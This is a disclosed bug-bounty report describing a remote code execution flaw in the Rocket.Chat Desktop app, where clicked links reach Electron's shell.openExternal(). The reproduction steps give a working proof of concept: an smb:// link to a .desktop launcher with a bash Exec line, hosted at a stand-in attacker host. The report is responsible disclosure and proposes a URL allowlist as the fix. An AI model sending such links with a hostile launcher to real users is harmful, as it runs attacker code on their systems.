# [C] Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE

## Summary
Severity: Critical (CVSS 9.0)
Program: Rocket.Chat
Weakness: OS Command Injection
Reporter: baltpeter
State: resolved
Disclosed: 2022-08-01T10:17:37.113Z
Source: https://hackerone.com/reports/924151

## Details
**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.

**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.

## Releases Affected:

  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron

## Steps To Reproduce (from initial installation to vulnerability):

  1. Install Rocket.Chat Desktop on Xubuntu 20.04.
  2. Login and join a channel.
  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:
     
     ```ini
    [Desktop Entry]
    Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
    Type=Application
     ```
  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`
  5. Click the link and (if necessary) confirm starting the untrusted launcher.
  6. Notice the calculator and message box appearing, confirming remote code execution.

## Supporting Material/References:

  * I have attached a video of the attack to the report.

## Suggested mitigation

  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.

Best Regards,  
Benjamin Altpeter  
Technical University of Braunschweig, Germany

## Impact

_Trimmed to 38 lines — full report: https://hackerone.com/reports/924151_
